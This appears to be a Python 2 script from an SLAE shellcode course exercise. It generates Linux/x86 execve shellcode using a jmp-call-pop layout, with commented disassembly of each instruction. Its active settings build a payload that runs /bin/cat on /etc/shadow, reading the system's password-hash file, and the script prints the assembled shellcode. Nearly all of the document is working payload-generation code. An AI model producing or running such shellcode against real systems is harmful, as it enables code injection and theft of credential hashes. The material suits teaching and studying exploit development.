#!/usr/bin/python

# SLAE Exercise: Execve Argv Shellcode (Linux/x86) Generator
# Author: Ray Doyle (@doylersec)
# Website: https://www.doyler.net

#executable = "/bin/ls"
executable = "/bin/cat"
exeLen = len(executable)
exeShellcode = "x" + "\\x".join("{:02x}".format(ord(c)) for c in executable)

#arguments = "-al"
arguments = "/etc/shadow"
argLen = len(arguments)
argShellcode = "x" + "\\x".join("{:02x}".format(ord(c)) for c in arguments)

space = (argLen % 4) + 1

# Number of bytes after 1st jump until 0x80 (inclusive)
jmp1 = 37 + space

# Number of bytes after 2nd jump until end of exe shellcode (inclusive)
jmp2 = 23 + exeLen + space

# Number of bytes from program (pop esi start) until 1st CALL + 4 (to skip back over CALL)
call1 = 37 + 4 + space

# Number of bytes from args (after first jump) until 2nd CALL + 4 (skip back)
call2 = 23 + exeLen + 4 + space

#  8048060:    eb 26                    jmp    8048088 <call_program>]
shellcode = ("\\xeb\\" + ("x%02x" % jmp1) + "" # JMP SHORT to call_program (right after 0x80)
#
#
# 8048062:    5e                       pop    esi
# 8048063:    31 c0                    xor    eax,eax
# 8048065:    50                       push   eax
# 8048066:    89 e7                    mov    edi,esp
# 8048068:    b1 07                    mov    cl,0x7
# 804806a:    f3 a4                    rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
# 804806c:    89 07                    mov    DWORD PTR [edi],eax
# 804806e:    89 e3                    mov    ebx,esp
# 8048070:    50                       push   eax
# 8048071:    89 e2                    mov    edx,esp
#
#
"\\x5e\\x31\\xc0\\x50\\x89\\xe7\\xb1\\" + ("x%02x" % exeLen) + "\\xf3\\xa4\\x89\\x07\\x89\\xe3\\x50\\x89\\xe2"
#
#
# 8048073:    eb 1f                    jmp    8048094 <call_args>
#
#
"\\xeb\\" + ("x%02x" % jmp2) + "" # JMP SHORT to call_args
#
#
# 8048075:    5e                       pop    esi
# 8048076:    50                       push   eax
# 8048077:    89 e7                    mov    edi,esp
# 8048079:    b1 03                    mov    cl,0x3
# 804807b:    f3 a4                    rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
# 804807d:    89 e6                    mov    esi,esp
# 804807f:    50                       push   eax
# 8048080:    56                       push   esi
# 8048081:    53                       push   ebx
# 8048082:    89 e1                    mov    ecx,esp
# 8048084:    b0 0b                    mov    al,0xb
# 8048086:    cd 80                    int    0x80
#
#
"\\x5e" + ("\\x50" * space) + "\\x89\\xe7\\xb1\\" + ("x%02x" % argLen) + "\\xf3\\xa4\\x89\\xe6\\x50\\x56\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
#
#
# 8048088:    e8 d5 ff ff ff           call   8048062 <program>
#
#
"\\xe8\\" + ("x%02x" % (255 - call1)) + "\\xff\\xff\\xff" # CALL program
"\\" + exeShellcode + ""
"\\xe8\\" + ("x%02x" % (255 - call2)) + "\\xff\\xff\\xff\\" + argShellcode)

print shellcode